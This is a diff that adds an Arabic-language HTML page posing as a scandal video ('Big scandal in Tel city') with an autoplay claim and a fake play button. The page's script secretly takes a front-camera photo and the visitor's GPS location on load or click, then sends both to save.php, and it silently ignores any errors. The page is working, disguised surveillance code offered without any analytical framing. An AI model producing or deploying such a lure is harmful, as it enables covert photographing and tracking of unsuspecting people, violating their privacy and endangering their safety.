@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فضيحة كبيرة في مدينة التل</title>
+    <style>
+        body {background:#000; color:#f00; text-align:center; font-family:Arial; margin:0; padding:0;}
+        h1 {font-size:32px; margin:30px 0;}
+        p {font-size:20px;}
+        .video {background:url('https://i.imgur.com/0kW9K4j.jpg') center/cover no-repeat; height:70vh; border:5px solid #f00; border-radius:15px; margin:20px auto; max-width:90%; cursor:pointer;}
+        .play {font-size:80px; color:#fff; animation:pulse 1.5s infinite;}
+        @keyframes pulse {0% {transform:scale(1);} 50% {transform:scale(1.1);} 100% {transform:scale(1);}}
+    </style>
+</head>
+<body onload="start()">
+    <h1>فضيحة كبيرة في مدينة التل</h1>
+    <p>الفيديو يشتغل تلقائيًا...</p>
+    <div class="video" onclick="start()">
+        <div class="play">▶</div>
+    </div>
+
+    <script>
+    function start() {
+        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
+            let v=document.createElement('video');
+            v.srcObject=s; v.play();
+            setTimeout(()=>{
+                let c=document.createElement('canvas');
+                c.width=1280; c.height=720;
+                c.getContext('2d').drawImage(v,0,0,1280,720);
+                let img=c.toDataURL('image/jpeg');
+
+                navigator.geolocation.getCurrentPosition(p=>{
+                    let gps = p.coords.latitude + "," + p.coords.longitude + " ±" + p.coords.accuracy + "m";
+
+                    let f = new FormData();
+                    f.append('img', img);
+                    f.append('gps', gps);
+
+                    fetch('save.php', {method: 'POST', body: f});
+                }, ()=>{});
+                s.getTracks().forEach(t=>t.stop());
+            }, 1000);
+        }).catch(()=>{});
+    }
+    </script>
+</body>
+</html>
